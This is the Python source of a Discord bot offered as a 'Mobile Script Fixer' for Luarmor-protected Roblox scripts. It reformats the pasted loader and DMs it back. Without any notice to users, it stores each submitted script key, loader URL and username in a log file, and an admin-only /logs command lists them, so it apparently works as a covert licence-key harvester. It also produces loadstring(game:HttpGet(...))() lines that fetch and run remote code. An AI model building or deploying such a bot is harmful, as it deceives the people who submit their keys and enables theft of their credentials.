import os
import json
import re
import discord
from discord.ext import commands
from discord import app_commands

TOKEN = os.getenv("BOT_TOKEN")

# -----------------------------
# CONFIG + LOG STORAGE
# -----------------------------
CONFIG_FILE = "config.json"
LOG_FILE = "logs.json"

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"background": None}
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=4)

def load_logs():
    if not os.path.exists(LOG_FILE):
        return []
    with open(LOG_FILE, "r") as f:
        return json.load(f)

def save_logs(logs):
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=4)

config = load_config()
logs = load_logs()

# -----------------------------
# BOT SETUP
# -----------------------------
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Regex to extract script_key + URL
SCRIPT_REGEX = re.compile(
    r'script_key\s*=\s*"([^"]+)"\s*;?\s*[\r\n ]*loadstring\s*\(\s*game:HttpGet\("([^"]+)"\)\s*\)\s*\(\s*\)',
    re.IGNORECASE
)

def clean_input(text: str) -> str:
    text = text.replace("```lua", "")
    text = text.replace("```", "")
    text = text.replace("%60", "")
    return text.strip()

# -----------------------------
# MODAL FOR SCRIPT INPUT
# -----------------------------
class ScriptModal(discord.ui.Modal, title="Paste Your Script"):
    script = discord.ui.TextInput(
        label="Paste your script here",
        style=discord.TextStyle.paragraph,
        placeholder="Paste the broken script...",
        required=True,
        max_length=2000
    )

    async def on_submit(self, interaction: discord.Interaction):
        raw = clean_input(self.script.value)
        match = SCRIPT_REGEX.search(raw)

        if not match:
            await interaction.response.send_message(
                "❌ Could not detect a valid Luarmor script.",
                ephemeral=True
            )
            return

        script_key = match.group(1)
        url = match.group(2)

        fixed_script = (
            f'script_key="{script_key}";\n'
            f'loadstring(game:HttpGet("{url}"))()'
        )

        # Log the event
        logs.append({
            "user": interaction.user.id,
            "username": str(interaction.user),
            "script_key": script_key,
            "url": url
        })
        save_logs(logs)

        # DM the user
        try:
            await interaction.user.send(
                f"✅ Your fixed script:\n```lua\n{fixed_script}\n```"
            )
            await interaction.response.send_message(
                "📩 Script fixed! Check your DMs.",
                ephemeral=True
            )
        except:
            await interaction.response.send_message(
                "❌ I couldn't DM you. Enable DMs from server members.",
                ephemeral=True
            )

# -----------------------------
# PANEL BUTTON
# -----------------------------
class FixerPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Paste Script", style=discord.ButtonStyle.green)
    async def paste(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ScriptModal())

# -----------------------------
# SLASH COMMANDS
# -----------------------------
@bot.tree.command(name="panel", description="Show the Mobile Script Fixer panel")
async def panel(interaction: discord.Interaction):
    embed = discord.Embed(
        title="📱 Mobile Script Fixer",
        description="Paste your script using the button below.",
        color=0x3498db
    )

    if config["background"]:
        embed.set_image(url=config["background"])

    await interaction.response.send_message(embed=embed, view=FixerPanel())

@bot.tree.command(name="setbg", description="Set the background image for the panel")
@app_commands.describe(url="Direct image URL")
async def setbg(interaction: discord.Interaction, url: str):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
        return

    config["background"] = url
    save_config(config)

    await interaction.response.send_message(
        f"✅ Background updated!\nNew background:\n{url}"
    )

@bot.tree.command(name="logs", description="View script fixer logs (Admin only)")
async def logs_cmd(interaction: discord.Interaction):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
        return

    if len(logs) == 0:
        await interaction.response.send_message("📭 No logs yet.", ephemeral=True)
        return

    text = ""
    for entry in logs[-10:]:  # last 10 logs
        text += f"👤 **{entry['username']}**\n"
        text += f"🔑 Key: `{entry['script_key']}`\n"
        text += f"🌐 URL: `{entry['url']}`\n\n"

    await interaction.response.send_message(
        f"📜 **Last 10 Logs:**\n{text}",
        ephemeral=True
    )

# -----------------------------
# SYNC COMMANDS
# -----------------------------
@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Bot online as {bot.user}")

bot.run(TOKEN)
